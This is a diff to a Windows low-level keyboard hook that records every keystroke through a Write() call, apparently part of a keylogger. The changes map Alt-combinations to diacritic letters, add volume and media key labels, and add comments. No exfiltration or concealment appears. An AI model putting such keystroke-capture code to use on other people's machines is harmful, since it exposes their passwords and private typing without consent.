@@ -68,7 +68,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             {
             case 0x41:
             {
-                Write(caps ? (shift ? "a" : "A") : (shift ? "A" : "a"));
+                Write(wParam==WM_SYSKEYDOWN? "ā": (caps ? (shift ? "a" : "A") : (shift ? "A" : "a")));
                 break;
             }
             case 0x42:
@@ -83,12 +83,12 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case 0x44:
             {
-                Write(caps ? (shift ? "d" : "D") : (shift ? "D" : "d"));
+                Write(wParam == WM_SYSKEYDOWN ? "ḍ" : (caps ? (shift ? "d" : "D") : (shift ? "D" : "d")));
                 break;
             }
             case 0x45:
             {
-                Write(caps ? (shift ? "e" : "E") : (shift ? "E" : "e"));
+                Write(wParam == WM_SYSKEYDOWN ? "ē" : (caps ? (shift ? "e" : "E") : (shift ? "E" : "e")));
                 break;
             }
             case 0x46:
@@ -98,17 +98,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case 0x47:
             {
-                Write(caps ? (shift ? "g" : "G") : (shift ? "G" : "g"));
+                Write(wParam == WM_SYSKEYDOWN ? "ṅ" : (caps ? (shift ? "g" : "G") : (shift ? "G" : "g")));
                 break;
             }
             case 0x48:
             {
-                Write(caps ? (shift ? "h" : "H") : (shift ? "H" : "h"));
+                Write(wParam == WM_SYSKEYDOWN ? "ḥ" : (caps ? (shift ? "h" : "H") : (shift ? "H" : "h")));
                 break;
             }
             case 0x49:
             {
-                Write(caps ? (shift ? "i" : "I") : (shift ? "I" : "i"));
+                Write(wParam == WM_SYSKEYDOWN ? "ī" : (caps ? (shift ? "i" : "I") : (shift ? "I" : "i")));
                 break;
             }
             case 0x4A:
@@ -123,22 +123,22 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case 0x4C:
             {
-                Write(caps ? (shift ? "l" : "L") : (shift ? "L" : "l"));
+                Write(wParam == WM_SYSKEYDOWN ? "l̥" : (caps ? (shift ? "l" : "L") : (shift ? "L" : "l")));
                 break;
             }
             case 0x4D:
             {
-                Write(caps ? (shift ? "m" : "M") : (shift ? "M" : "m"));
+                Write(wParam == WM_SYSKEYDOWN ? "ṁ" : (caps ? (shift ? "m" : "M") : (shift ? "M" : "m")));
                 break;
             }
             case 0x4E:
             {
-                Write(caps ? (shift ? "n" : "N") : (shift ? "N" : "n"));
+                Write(wParam == WM_SYSKEYDOWN ? "ṇ" : (caps ? (shift ? "n" : "N") : (shift ? "N" : "n")));
                 break;
             }
             case 0x4F:
             {
-                Write(caps ? (shift ? "o" : "O") : (shift ? "O" : "o"));
+                Write(wParam == WM_SYSKEYDOWN ? "ō" : (caps ? (shift ? "o" : "O") : (shift ? "O" : "o")));
                 break;
             }
             case 0x50:
@@ -148,27 +148,27 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case 0x51:
             {
-                Write(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"));
+                Write(wParam == WM_SYSKEYDOWN ? "æ" : (caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q")));
                 break;
             }
             case 0x52:
             {
-                Write(caps ? (shift ? "r" : "R") : (shift ? "R" : "r"));
+                Write(wParam == WM_SYSKEYDOWN ? "r̥" : (caps ? (shift ? "r" : "R") : (shift ? "R" : "r")));
                 break;
             }
             case 0x53:
             {
-                Write(caps ? (shift ? "s" : "S") : (shift ? "S" : "s"));
+                Write(wParam == WM_SYSKEYDOWN ? "ś" : (caps ? (shift ? "s" : "S") : (shift ? "S" : "s")));
                 break;
             }
             case 0x54:
             {
-                Write(caps ? (shift ? "t" : "T") : (shift ? "T" : "t"));
+                Write(wParam == WM_SYSKEYDOWN ? "ṭ" : (caps ? (shift ? "t" : "T") : (shift ? "T" : "t")));
                 break;
             }
             case 0x55:
             {
-                Write(caps ? (shift ? "u" : "U") : (shift ? "U" : "u"));
+                Write(wParam == WM_SYSKEYDOWN ? "ū" : (caps ? (shift ? "u" : "U") : (shift ? "U" : "u")));
                 break;
             }
             case 0x56:
@@ -183,12 +183,12 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case 0x58:
             {
-                Write(caps ? (shift ? "x" : "X") : (shift ? "X" : "x"));
+                Write(wParam == WM_SYSKEYDOWN ? "ṣ" : (caps ? (shift ? "x" : "X") : (shift ? "X" : "x")));
                 break;
             }
             case 0x59:
             {
-                Write(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"));
+                Write(wParam == WM_SYSKEYDOWN ? "ñ" : (caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y")));
                 break;
             }
             case 0x5A:
@@ -562,10 +562,29 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
                 Write("[F12]");
                 break;
             }
-            default:
+            case VK_VOLUME_DOWN:{
+                Write("[VOL DOWN]");
+                break;
+            }
+            case VK_VOLUME_UP:
             {
-                DWORD dWord = key->scanCode << 16;
-                dWord += key->flags << 24;
+                Write("[VOL UP]");
+                break;
+            }
+            case VK_VOLUME_MUTE:
+            {
+                Write("[VOL MUTE]");
+                break;
+            }
+            case VK_MEDIA_PLAY_PAUSE: 
+            {
+                Write("[PLAY/PAUSE]");
+                break;
+            } 
+            default: //handling any other 'extended keys'
+            {
+                DWORD dWord = key->scanCode << 16; //scancode is from bit 16-23 in lParam (scancode != virtual key code)
+                dWord += key->flags << 24; //Extended key flag lies at bit 24
                 char otherKey[16] = "";
                 if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0)
                     Write(otherKey);
@@ -573,7 +592,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
         }
     }
-    return CallNextHookEx(NULL, nCode, wParam, lParam);
+    return CallNextHookEx(NULL, nCode, wParam, lParam); //compulsory call to next hook procedure (in this case there is no next hook procedure, hence first parameter is NULL)
 }
 
 void HookUnhook()
